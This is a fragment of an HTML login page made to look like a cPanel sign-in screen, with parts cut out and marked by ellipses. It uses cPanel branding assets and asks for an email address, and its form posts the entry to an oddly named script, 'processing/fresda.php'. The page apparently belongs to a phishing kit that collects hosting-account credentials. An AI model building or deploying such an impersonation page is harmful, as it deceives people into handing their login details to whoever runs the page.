    ...
    <div id="notify">
        <noscript>
            <div class="error-notice">
                <img src="cPanel_assets/img/notice-error.png" alt="Error" align="left"/>
        ...
        <div id="login-container">
            ...
            <div id="login-sub-container">
                    ...
                    <div id="login-sub">
                        ...
                        <div id="forms">
                            <form  id="login_form" action="processing/fresda.php" method="post" target="_top" style="visibility:">
                                <div class="input-req-login"><label for="user">Email Address</label></div>
                                <div class="input-field-login icon username-container">
                                    <input name="user" id="user" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" pattern="((([0-9a-zA-Z]((\.(?!\.))|[-!#\$%&'\*\+/=\?\^`\{\}\|~\w])*)[0-9a-zA-Z]@)(([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,22}))" tabindex="1" required="">
                                </div>
